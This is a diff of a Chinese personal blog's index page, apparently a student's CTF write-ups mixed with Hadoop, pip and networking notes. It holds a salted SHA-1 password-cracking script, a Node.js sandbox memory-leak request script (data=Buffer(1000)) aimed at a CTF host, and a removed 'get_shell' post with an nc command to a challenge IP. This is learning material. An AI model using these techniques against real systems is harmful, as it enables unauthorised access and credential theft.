+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pdfminer.pdfparser <span class="keyword">import</span> PDFParser</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfdocument <span class="keyword">import</span> PDFDocument</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfpage <span class="keyword">import</span> PDFPage</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfinterp <span class="keyword">import</span> PDFResourceManager, PDFPageInterpreter</span><br><span class="line"><span class="keyword">from</span> pdfminer.converter <span class="keyword">import</span> PDFPageAggregator</span><br><span class="line"><span class="keyword">from</span> pdfminer.layout <span class="keyword">import</span> LTTextBoxHorizontal, LAParams</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pdf_2_txt</span>(<span class="params">start, end</span>):</span></span><br><span class="line">    pdf_filename = start</span><br><span class="line">    txt_filename = end</span><br><span class="line">    <span class="comment"># 不显示warning</span></span><br><span class="line">    logging.propagate = <span class="literal">False</span></span><br><span class="line">    logging.getLogger().setLevel(logging.ERROR)</span><br><span class="line">    device = PDFPageAggregator(PDFResourceManager(), laparams=LAParams())</span><br><span class="line">    interpreter = PDFPageInterpreter(PDFResourceManager(), device)</span><br><span class="line">    parser = PDFParser(<span class="built_in">open</span>(pdf_filename, <span class="string">&#x27;rb&#x27;</span>))</span><br><span class="line">    doc = PDFDocument(parser)</span><br><span class="line">    parser.set_document(doc)</span><br><span class="line">    <span class="comment"># 检测文档是否提供txt转换，不提供就忽略</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> doc.is_extractable:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(txt_filename, <span class="string">&#x27;w+&#x27;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> fw:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;num page:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(<span class="built_in">list</span>(PDFPage.create_pages(doc)))))</span><br><span class="line">            <span class="keyword">for</span> page <span class="keyword">in</span> PDFPage.create_pages(doc):</span><br><span class="line">                interpreter.process_page(page)</span><br><span class="line">                layout = device.get_result()</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> layout:</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">isinstance</span>(x, LTTextBoxHorizontal):</span><br><span class="line">                        results = x.get_text()</span><br><span class="line">                        fw.write(results)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pwd</span>():</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">31</span>):</span><br><span class="line">        f = <span class="built_in">open</span>(filePath + <span class="string">&#x27;\\txt\\&#x27;</span> + <span class="built_in">str</span>(a) + <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>).read()</span><br><span class="line">        wordlist = re.split(<span class="string">&quot; |\n&quot;</span>, f)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> wordlist:</span><br><span class="line">            y = s + <span class="string">&quot;Salz!&quot;</span></span><br><span class="line">            encode = hashlib.sha1(y.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">            <span class="keyword">if</span> encode == <span class="string">&quot;3fab54a50e770d830c0416df817567662a9dc85c&quot;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;password is :&quot;</span> + s)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    filePath = <span class="string">&#x27;&#x27;</span>  <span class="comment"># 绝对路径</span></span><br><span class="line">    lists = os.listdir(filePath)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">31</span>):</span><br><span class="line">        x = filePath + <span class="string">&#x27;\\&#x27;</span> + lists[i - <span class="number">1</span>]</span><br><span class="line">        pdf_2_txt(x, filePath + <span class="string">&#x27;\\txt\\&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;.txt&#x27;</span>)  <span class="comment"># 在目录下创建一个txt文件夹</span></span><br></pre></td></tr></table></figure>
+
+<p>哎 我好菜</p>
+<p>ThinJerboa 是 密码</p>
+<p>flag{Th3_Fl4t_Earth_Prof_i$_n0T_so_Smart_huh?}</p>
  
       <!-- reward -->
       
@@ -200,170 +300,93 @@
 
     
     <article
-  id="post-1_Hello, CTF"
+  id="post-hadoop安装从0到1一"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
   data-scroll-reveal
 >
   <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2019/05/26/hadoop%E5%AE%89%E8%A3%85%E4%BB%8E0%E5%88%B01%E4%B8%80/"
+    >hadoop</a> 
+</h2>
+ 
+
+      
+    </header>
      
     <div class="article-meta">
-      <a href="/2021/11/15/1_Hello,%20CTF/" class="article-date">
-  <time datetime="2021-11-15T09:38:44.373Z" itemprop="datePublished">2021-11-15</time>
-</a>    
-    </div>
-      
-    <div class="article-entry" itemprop="articleBody">
-       
-  <h1 id="1-Hello-CTF"><a href="#1-Hello-CTF" class="headerlink" title="1_Hello, CTF"></a>1_Hello, CTF</h1><p>把文件放入ida</p>
-<p>搜索main函数 按下万能的F5</p>
-<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwa5v7golmj30is0kz10l.jpg" alt="image1.png"></p>
-<h2 id="memset"><a href="#memset" class="headerlink" title="memset"></a>memset</h2><p> <strong>void *memset(void *str, int c, size_t n)</strong> 复制字符 <strong>c</strong>（一个无符号字符）到参数 <strong>str</strong> 所指向的字符串的前 <strong>n</strong> 个字符。</p>
-<h2 id="strcat"><a href="#strcat" class="headerlink" title="strcat"></a>strcat</h2><p>C 库函数 <strong>char *strcat(char *dest, const char *src)</strong> 把 <strong>src</strong> 所指向的字符串追加到 <strong>dest</strong> 所指向的字符串的结尾。</p>
-<h2 id="sub-40134B"><a href="#sub-40134B" class="headerlink" title="sub_40134B"></a>sub_40134B</h2><p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwa5z8pppmj30cb075dh1.jpg" alt="image.png"></p>
-<p>我对于这个函数的理解是将定好的内容输出</p>
-<p>比如第一个就是输出 please input your serial</p>
-<h1 id="整体看一遍"><a href="#整体看一遍" class="headerlink" title="整体看一遍"></a>整体看一遍</h1><p>关键点在这里 </p>
-<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwa62ybzrrj307m02dt97.jpg" alt="image.png"></p>
-<p>需要让v10 和v13 相等</p>
-<p><img src="C:\Users\jw5t\AppData\Roaming\Typora\typora-user-images\image-20211110171239426.png" alt="image-20211110171239426"></p>
-<p>说明是转了16进制</p>
-<p>在线转  <a target="_blank" rel="noopener" href="https://www.bejson.com/convert/ox2str/">https://www.bejson.com/convert/ox2str/</a></p>
-<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwa67ecfj9j30st0e2gow.jpg" alt="image.png"></p>
-<p> flag ： CrackMeJustForFun</p>
- 
-      <!-- reward -->
-      
-    </div>
-    
-
-    <!-- copyright -->
-    
-    <footer class="article-footer">
-       
-    </footer>
+      <a href="/2019/05/26/hadoop%E5%AE%89%E8%A3%85%E4%BB%8E0%E5%88%B01%E4%B8%80/" class="article-date">
+  <time datetime="2019-05-26T04:12:57.000Z" itemprop="datePublished">2019-05-26</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%AD%A6%E6%A0%A1%E4%BD%9C%E4%B8%9A/">学校作业</a>
   </div>
-
-    
- 
-    
-</article>
-
-    
-    <article
-  id="post-get_shell"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
-     
-    <div class="article-meta">
-      <a href="/2021/11/15/get_shell/" class="article-date">
-  <time datetime="2021-11-15T09:38:44.371Z" itemprop="datePublished">2021-11-15</time>
-</a>    
+   
     </div>
       
     <div class="article-entry" itemprop="articleBody">
        
-  <p>在kali里面输入</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nv 111.200.241.244 49361</span><br></pre></td></tr></table></figure>
+  <h1 id="Hadoop安装从0到1【1-操作系统篇】"><a href="#Hadoop安装从0到1【1-操作系统篇】" class="headerlink" title="Hadoop安装从0到1【1.操作系统篇】"></a>Hadoop安装从0到1【1.操作系统篇】</h1><h2 id="虚拟机配置环节"><a href="#虚拟机配置环节" class="headerlink" title="虚拟机配置环节"></a>虚拟机配置环节</h2><h3 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h3><p>首先下载ubuntu 的镜像iso文件，然后安装</p>
+<p>系统镜像下载地址</p>
+<p><a target="_blank" rel="noopener" href="https://cn.ubuntu.com/download/desktop">https://cn.ubuntu.com/download/desktop</a></p>
+<p>此处安装太简单略过</p>
+<p>虚拟机安装完成后进入,是这个界面</p>
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gvl269vhoij60lo0s3k8j02.jpg" alt="a.png"></p>
+<p>很多同学会遇到下载速度很慢的情况</p>
+<p>这个原因是因为你们的ubuntu是在访问国外的服务器 ，所以速度很慢</p>
+<p>这里需要换源</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/apt/sources.list</span><br></pre></td></tr></table></figure>
 
-<p>直接连接</p>
-<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gw9t7ixuccj30dp0a0dgw.jpg" alt="a.png"></p>
- 
-      <!-- reward -->
-      
-    </div>
-    
+<p>将下列数据复制，黏贴到第一行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure>
 
-    <!-- copyright -->
-    
-    <footer class="article-footer">
-       
-    </footer>
-  </div>
+<p><strong>然后保存！！！！</strong></p>
+<p>再退出来</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cat /etc/apt/sources.list</span><br></pre></td></tr></table></figure>
 
-    
- 
-    
-</article>
+<p>看看上面的源是否黏贴进去了，没有就再试一次</p>
+<p><strong>接下来很重要</strong></p>
+<p>点左下角的菜单</p>
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gvl2d5kflbj60sg0uwtpy02.jpg" alt="GPH2987DC)RGVS_I$PJDT)Y.png"></p>
+<p>然后输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">softwae</span><br></pre></td></tr></table></figure>
 
-    
-    <article
-  id="post-无线知识总结"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
-     
-    <div class="article-meta">
-      <a href="/2021/10/22/%E6%97%A0%E7%BA%BF%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" class="article-date">
-  <time datetime="2021-10-22T12:29:07.051Z" itemprop="datePublished">2021-10-22</time>
-</a>    
-    </div>
-      
-    <div class="article-entry" itemprop="articleBody">
-       
-  <h1 id="无线知识总结"><a href="#无线知识总结" class="headerlink" title="无线知识总结"></a>无线知识总结</h1><p>中国的3G标准 TD-SCDMA 采用码分多址 </p>
-<p>美国3G标准  CDMA2000</p>
-<p>IEEE   802.11a 是5 Ghz </p>
-<h2 id="无线网主要使用三种通信技术"><a href="#无线网主要使用三种通信技术" class="headerlink" title="无线网主要使用三种通信技术"></a>无线网主要使用三种通信技术</h2><h4 id="红外线-IR"><a href="#红外线-IR" class="headerlink" title="红外线  IR"></a>红外线  IR</h4><h4 id="扩展频谱"><a href="#扩展频谱" class="headerlink" title="扩展频谱"></a>扩展频谱</h4><h5 id="频率跳动扩频FHSS"><a href="#频率跳动扩频FHSS" class="headerlink" title="频率跳动扩频FHSS"></a>频率跳动扩频FHSS</h5><h5 id="直接序列扩频DSSS"><a href="#直接序列扩频DSSS" class="headerlink" title="直接序列扩频DSSS"></a>直接序列扩频DSSS</h5><h4 id="窄带微波"><a href="#窄带微波" class="headerlink" title="窄带微波"></a>窄带微波</h4><h2 id="载波侦听多路访问"><a href="#载波侦听多路访问" class="headerlink" title="载波侦听多路访问"></a>载波侦听多路访问</h2><h3 id="CSMA-CA"><a href="#CSMA-CA" class="headerlink" title="CSMA/CA"></a>CSMA/CA</h3><p>冲突前进行处理</p>
-<p>信道利用率高</p>
-<h3 id="CSMA-CD"><a href="#CSMA-CD" class="headerlink" title="CSMA/CD"></a>CSMA/CD</h3><p>冲突后进行处理</p>
-<p>信道利用率高</p>
- 
-      <!-- reward -->
-      
-    </div>
-    
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gvl2eh99yoj60sg0uwaqx02.jpg" alt="asdsaa.png"></p>
+<p>会出现这个，点击圈出来的这个</p>
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gvl2gdxsofj60sg0uwqmm02.jpg" alt="a.png"></p>
+<p>然后会有这个</p>
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gvl2hp0e25j60sg0uw1b502.jpg" alt="ddddddddd.png"></p>
+<p>然后将他改成中国的中科大源，或者其他源也可以，只要是国内就慢不到哪里去</p>
+<p>根据我多年经验</p>
+<p>清华源东西全，但是用的人太多，速度有时候会抽风</p>
+<p>豆瓣偶尔抽风</p>
+<p>阿里腾讯云还好 偶尔用</p>
+<p>中科大源东西全，用的人少，速度巨快，直接跑满带宽，中科大永远的神  yyds！！！</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br></pre></td></tr></table></figure>
 
-    <!-- copyright -->
-    
-    <footer class="article-footer">
-       
-    </footer>
-  </div>
 
-    
- 
-    
-</article>
 
-    
-    <article
-  id="post-加密算法总结"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
-     
-    <div class="article-meta">
-      <a href="/2021/10/22/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93/" class="article-date">
-  <time datetime="2021-10-22T11:37:49.212Z" itemprop="datePublished">2021-10-22</time>
-</a>    
-    </div>
-      
-    <div class="article-entry" itemprop="articleBody">
-       
-  <h1 id="加密算法总结"><a href="#加密算法总结" class="headerlink" title="加密算法总结"></a>加密算法总结</h1><h2 id="公钥加密"><a href="#公钥加密" class="headerlink" title="公钥加密"></a>公钥加密</h2><p>又被称为非对称加密</p>
-<h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><p>即使公钥在网上被截获，如果没有与其匹配的私钥，也无法解密，极为适合在互联网上使用。</p>
-<h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><p>公钥加密在在计算上相当复杂，性能欠佳</p>
-<h3 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h3><p><strong>公钥用于 加密 和 验证</strong></p>
-<p><strong>私钥用于 解密 和 签名</strong></p>
-<p>可以用于 报文认证</p>
-<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><h4 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h4><h4 id="DSA"><a href="#DSA" class="headerlink" title="DSA"></a>DSA</h4><h4 id="ECC"><a href="#ECC" class="headerlink" title="ECC"></a>ECC</h4><h2 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h2><h3 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h3><h4 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h4><h4 id="3DES"><a href="#3DES" class="headerlink" title="3DES"></a>3DES</h4><p>两种密钥 加密三次</p>
-<h4 id="RC5"><a href="#RC5" class="headerlink" title="RC5"></a>RC5</h4><p>64位的块大小，128位的密钥</p>
-<h4 id="idea"><a href="#idea" class="headerlink" title="idea"></a>idea</h4><p>明文和密文都是64位 密钥长度是128位</p>
-<h2 id="消息摘要算法"><a href="#消息摘要算法" class="headerlink" title="消息摘要算法"></a>消息摘要算法</h2><p>把信息分为512bit的分组，并且创建一个128bit的摘要</p>
-<p>sha-1 分为512bit的分组， 是160 bit的摘要</p>
-<h1 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h1><p>如果有数字证书 需要先用CA的公钥验证证书的真伪 再利用发送方的公钥验证发送方消息</p>
+<p>试试看，如果不是和电影里面黑客操作系统那样刷数字字符飞快的话（就是下载速度很快，没有1M也有几百kb每秒）就是没配置成功，再配一次</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gcc</span><br></pre></td></tr></table></figure>
+
+<p>下载个gcc 试试水</p>
+<p>几秒下好</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -v</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gvl2rmk7taj60js0cwk4a02.jpg" alt="QO@RL%7HFEP_$S%LSMA)I2F.png"></p>
+<p>有这样的图片就是成功了</p>
+<h2 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h2><p>下载java </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install openjdk-8-jdk</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gvl2tk44qgj60k20de17302.jpg" alt="$HKSAKW73)6Q2`@`%DK}EB.png"></p>
+<p>5秒下好</p>
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gvl2u4m8r4j60ip031wgo02.jpg" alt="ATN[~$]ZM{T~TFV3D41H(PX.png"></p>
+<p>至此，操作系统基本环境算是配置完成了</p>
  
       <!-- reward -->
       
@@ -391,11 +414,26 @@
   data-scroll-reveal
 >
   <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2019/05/26/pip%E6%8D%A2%E6%BA%90/"
+    >python pip 换源</a> 
+</h2>
+ 
+
+      
+    </header>
      
     <div class="article-meta">
-      <a href="/2021/10/21/pip%E6%8D%A2%E6%BA%90/" class="article-date">
-  <time datetime="2021-10-21T07:55:50.041Z" itemprop="datePublished">2021-10-21</time>
-</a>    
+      <a href="/2019/05/26/pip%E6%8D%A2%E6%BA%90/" class="article-date">
+  <time datetime="2019-05-26T04:12:57.000Z" itemprop="datePublished">2019-05-26</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%94%9F%E6%B4%BB%E5%B0%8F%E6%8A%80%E5%B7%A7/">生活小技巧</a>
+  </div>
+   
     </div>
       
     <div class="article-entry" itemprop="articleBody">
@@ -428,27 +466,55 @@
 
     
     <article
-  id="post-ios传文件"
+  id="post-leaking"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
   data-scroll-reveal
 >
   <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2019/05/26/leaking/"
+    >nodejs沙箱逃逸</a> 
+</h2>
+ 
+
+      
+    </header>
      
     <div class="article-meta">
-      <a href="/2021/10/20/ios%E4%BC%A0%E6%96%87%E4%BB%B6/" class="article-date">
-  <time datetime="2021-10-20T09:02:50.063Z" itemprop="datePublished">2021-10-20</time>
-</a>    
+      <a href="/2019/05/26/leaking/" class="article-date">
+  <time datetime="2019-05-26T04:12:57.000Z" itemprop="datePublished">2019-05-26</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/web/">web</a> / <a class="article-category-link" href="/categories/web/ctf/">ctf</a>
+  </div>
+   
     </div>
       
     <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="IOS电脑给手机快速传文件方法"><a href="#IOS电脑给手机快速传文件方法" class="headerlink" title="IOS电脑给手机快速传文件方法"></a>IOS电脑给手机快速传文件方法</h1><p>在要传输的文件目录打开powershell</p>
-<p>需要有python环境</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure>
+  <p>nodejs沙箱逃逸</p>
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwerdkcp2pj30u20ssqfb.jpg" alt="image.png"></p>
+<p>eval(“var flag_” + randomstring.generate(64) + “ = &quot;flag{“ + flag + “}&quot;;”)</p>
+<p>  if (<em>req</em>.query.data &amp;&amp; <em>req</em>.query.data.length &lt;= 12) {</p>
+<p>​    <em>var</em> vm = new VM({</p>
+<p>​      timeout: 1000</p>
+<p>​    });</p>
+<p>​    console.log(<em>req</em>.query.data);</p>
+<p>​    <em>res</em>.send(“eval -&gt;” + vm.run(<em>req</em>.query.data));</p>
+<p>  } else {</p>
+<p>​    <em>res</em>.send(fs.readFileSync(__filename).toString());</p>
+<p>  }</p>
+<p>其中 要满足<em>req</em>.query.data &amp;&amp; <em>req</em>.query.data.length &lt;= 12</p>
+<p>有get data  且长度小于12</p>
+<p>eval -&gt;” + vm.run(<em>req</em>.query.data</p>
+<p>构建payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> _thread</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req</span>():</span></span><br><span class="line">    burp0_url = <span class="string">&quot;http://111.200.241.244:65075/?data=Buffer(1000)&quot;</span></span><br><span class="line">    burp0_cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;42vk7uq3siu00csvncvn1cr3o4&quot;</span>, <span class="string">&quot;td_cookie&quot;</span>: <span class="string">&quot;298269563&quot;</span>&#125;</span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;If-None-Match&quot;</span>: <span class="string">&quot;W/\&quot;599-+8B/Bay7p6jffTGBFcikJZKicLY\&quot;&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">    result=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies).text</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">result</span>):</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#123;&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;flag&#123;&quot;</span> + re.match(<span class="string">&quot;(.*)flag&#123;(.*)&#125;(.*)&quot;</span>, result).group(<span class="number">2</span>) + <span class="string">&quot;&#125;\n\n\n\n\n\n\n&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        <span class="comment"># try:</span></span><br><span class="line">        <span class="comment">#     _thread.start_new_thread(check(req()))</span></span><br><span class="line">        <span class="comment"># except:</span></span><br><span class="line">        <span class="comment">#     print(&quot;error&quot;)</span></span><br><span class="line">        check(req())</span><br></pre></td></tr></table></figure>
 
-<p>如果这个文件夹有其他的文件，连接者还可以下载该目录下其他文件</p>
  
       <!-- reward -->
       
@@ -476,11 +542,26 @@
   data-scroll-reveal
 >
   <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2019/05/26/hadoop%E5%AE%89%E8%A3%85%E4%BB%8E0%E5%88%B01%E4%BA%8C/"
+    >hadoop</a> 
+</h2>
+ 
+
+      
+    </header>
      
     <div class="article-meta">
-      <a href="/2021/10/20/hadoop%E5%AE%89%E8%A3%85%E4%BB%8E0%E5%88%B01%E4%BA%8C/" class="article-date">
-  <time datetime="2021-10-19T18:44:05.478Z" itemprop="datePublished">2021-10-20</time>
-</a>    
+      <a href="/2019/05/26/hadoop%E5%AE%89%E8%A3%85%E4%BB%8E0%E5%88%B01%E4%BA%8C/" class="article-date">
+  <time datetime="2019-05-26T04:12:57.000Z" itemprop="datePublished">2019-05-26</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%AD%A6%E6%A0%A1%E4%BD%9C%E4%B8%9A/">学校作业</a>
+  </div>
+   
     </div>
       
     <div class="article-entry" itemprop="articleBody">
@@ -627,78 +708,258 @@
 
     
     <article
-  id="post-hadoop安装从0到1一"
+  id="post-ios传文件"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
   data-scroll-reveal
 >
   <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
